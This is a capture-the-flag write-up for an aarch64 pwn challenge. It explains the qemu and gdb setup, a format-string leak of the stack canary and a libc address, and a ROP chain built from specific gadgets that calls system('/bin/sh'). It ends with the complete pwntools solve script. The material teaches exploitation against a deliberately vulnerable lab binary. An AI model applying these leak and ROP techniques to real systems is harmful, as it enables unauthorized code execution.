![image](https://github.com/fyrepaw13/ctf_writeups/assets/62428064/821f9720-c70c-4f8e-b171-361268854f69)

This was the first time I faced a challenge that was using aarch64 architecture. Unfortunately, I wasn't able to solve this during the CTF but I read the writeups and was able to try it myself.

NOTE : The solve script is the official writeup from the author. This is just my attempt at explaining how to solve this challenge

To be able solve this challenge, we first must set up the environment for the challenge.

## Setup

For debugging, we can use 

```
gdb-multiarch: sudo apt-get install gdb-multiarch
```

To run the binary, we need to install

```
qemu: sudo apt-get install qemu-user-static
libs: sudo apt-get install libc6-arm64-cross installs to /usr/aarch64-linux-gnu/
Running the binary
```

Next, we need to extract the libc from the Dockerfile.

```
docker run -v "`pwd`:/chal" -it <HASH> bash
```

Replace <HASH> with the hash value from the Dockerfile and it should set you up in the environment and mount files in your current directory into the /chal folder. Next, go into the chal folder and run `ldd ./chal` to look for the libc. After locating it, now you must run `cp /lib/x86_64-linux-gnu/<YOUR_LIBC> .` and copy the libc to the current directory. Use the command `exit` to leave the docker instance

### Debugging

```
qemu-aarch64-static -g 1234 ./chal
```

Run this command and pass in the -g flag which enables debugging mode

```
$gdb-multiarch
file chal
target remote :1234
```

Now, we will connect to our remote debugging session at port 1234


## Initial Analysis

```
└─$ checksec --file=chal         
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   108 Symbols       No    0               2               chal
```

Stack Canary and NX has been enabled

<details>
<summary>get_address()</summary>
  
```c
void get_address(void)

{
  int iVar1;
  char acStack_30 [40];
  long local_8;
  
  local_8 = ___stack_chk_guard;
  printf("\tCould we have an address to ship said appendage? ",0);
  __isoc99_scanf(&DAT_00400ea0,acStack_30);
  printf("\nThanks, we will ship to: ");
  printf(acStack_30);
  iVar1 = putchar(10);
  clear_buffer(iVar1);
  if (local_8 - ___stack_chk_guard != 0) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(&__stack_chk_guard,0,local_8 - ___stack_chk_guard);
  }
  return;
}
```

</details>

<details>
<summary>feedback()</summary>
  
```c
void feedback(void)

{
  char buff [104];
  long local_8;
  
  local_8 = ___stack_chk_guard;
  puts("Care to leave some feedback?!");
  fgets(buff,256,_stdin);
  puts("Thanks!");
  if (local_8 - ___stack_chk_guard != 0) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail(&__stack_chk_guard,0,local_8 - ___stack_chk_guard);
  }
  return;
}
```

</details>

From the results of the decompilation, it is clear that we need to leak the stack canary using the format string vulnerability and overflow the feedback function into a ret2libc 

## Exploitation

So after entering the %p format, we found out that we can get a canary leak at %19$p and a libc leak at %21$p

![image](https://github.com/fyrepaw13/ctf_writeups/assets/62428064/a1aca2b8-af69-439a-bd8d-1c3371a8dd02)

Using gdb to inspect the memory

![image](https://github.com/fyrepaw13/ctf_writeups/assets/62428064/97707e63-a6c0-41cf-8cee-c3be236d0d34)

We found that the leak is located inside __libc_start_main at offset 152. We can easily calculate the libc address using

```py
libc_start_main = libc_start_main_leak - 152
libc.address = libc_start_main - libc.symbols['__libc_start_main']
```

## ROP

Before we go into the ROP, we need to first understand the registers in aarch64.

### Registers

x0 to x7 are used to pass arguments, similar to rdi, rsi and rdx

x29 is similar to rbp

x30 stores the return address

### Function Prologue, Epilogue and Stack Layout

For this part, you can read this [writeup](https://d0ublew.github.io/writeups/imaginaryctf-2023/pwn/generic-rop-challenge/index.html)

Now, we need to look for suitable gadgets that can pass in "/bin/sh" into the x0 register and call system()

```
0x00000000004008f4 # 0x00000000004008f4 : ldr x19, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret
0x0000000000400910 # 0x0000000000400910 : mov x2, sp ; ldp x29, x30, [sp], #0x10 ; ret
0x000000000040091c : ldr x0, [x2, #0x10] ; ldp x29, x30, [sp], #0x10 ; ret
```

Fortunately for us, there gadgets are available which lets us mov a value we specify into x2, then load the value from x2 (at a offset of 0x10) into x0

```py
payload = flat([
    'a' * 104,
    canary,
    'b' * 8,    #x29
    mov_x2_sp,  #x30
    'c' * 8,
    canary,
    'd' * 8,    #x2     #x29
    ldr_x19,            #x30
    binsh,
    ldr_x0_x2,
    'e' * 24,
    libc.symbols['system']
])
```

This is what our payload will look like

![image](https://github.com/fyrepaw13/ctf_writeups/assets/62428064/e9800280-2260-4923-88f8-8450d01f0d8f)

First, we will overflow with the canary, b*8 for x29 and mov_x2_sp for x30. So when main returns, it will return to mov_x2_sp and increment $sp by 32, so the $sp will now point to dddddddd

`mov_x2_sp = 0x0000000000400910 # 0x0000000000400910 : mov x2, sp ; ldp x29, x30, [sp], #0x10 ; ret`

Since $sp point to dddddddd, it will be mov into x2 so x2 = dddddddd, then it will load dddddddd and ldr_x19 into x29, x30 respectively. Then $sp will increment by 16 and will now point to binsh

`ldr_x19 = 0x00000000004008f4 # 0x00000000004008f4 : ldr x19, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret`

Since $sp point to binsh, it will load sp + 16 into x19, so now x19 will point to eeeeeeee. Then, it will load binsh and ldr_x0_x2 into x29, x30 respectively. Then $sp will increment by 32 and will now point to the last 8 eeeeeeee

`ldr_x0_x2 = 0x000000000040091c # 0x000000000040091c : ldr x0, [x2, #0x10] ; ldp x29, x30, [sp], #0x10 ; ret`

Since x2 is pointing to dddddddd, it will load dddddddd + 16, which is binsh into x0. Then, it will load eeeeeeee and libc.symbol['system'] into x29, x30 respectively. Then return to system because its in x30

## Official Solve Script

```py
from pwn import *

# context.terminal = ['tmux', 'split-window', '-h']

elf = context.binary = ELF('chal')
libc = ELF('libc.so.6')
ld = ELF('ld-linux-aarch64.so.1')

p = process('qemu-aarch64 -g 1234 chal'.split())

# p = process('qemu-aarch64 chal'.split())

# p = remote('localhost', 1234)

p.sendlineafter(b'2. Legs\n', b'1')
p.sendlineafter(b'of?\n', b'1337')
p.sendlineafter(b'appendage? ', b'%13$p%21$p%19$p')

p.recv()
leaks = p.recv().split(b'0x')
# main is at the 23rd offset
main_leak = leaks[1]
main = int(main_leak, 16)
# libc_start_main + 152 is at the 21st offset MAKE SURE TO SUBTRACT 152 FROM THE LEAK
libc_start_main_leak = leaks[2]
libc_start_main = int(libc_start_main_leak, 16) - 152

canaryleak = leaks[3].split(b'\n')[0]
canary = int(canaryleak, 16)

print(hex(libc.symbols['__libc_start_main']))
libc.address = libc_start_main - libc.symbols['__libc_start_main']
print(leaks)
print(hex(canary))
print(hex(libc.address))

ldr_x19 = 0x00000000004008f4 # 0x00000000004008f4 : ldr x19, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret
binsh = libc.search(b'/bin/sh').__next__()
mov_x2_sp = 0x0000000000400910 # 0x0000000000400910 : mov x2, sp ; ldp x29, x30, [sp], #0x10 ; ret
ldr_x0_x2 = 0x000000000040091c # 0x000000000040091c : ldr x0, [x2, #0x10] ; ldp x29, x30, [sp], #0x10 ; ret
payload = flat([
    'a' * 104,
    canary,
    'b' * 8,    #x29
    mov_x2_sp,  #x30
    'c' * 8,
    canary,
    'd' * 8,    #x2     #x29
    ldr_x19,            #x30
    binsh,
    ldr_x0_x2,
    'e' * 24,
    libc.symbols['system']
])

p.sendline(payload)
p.interactive()
```
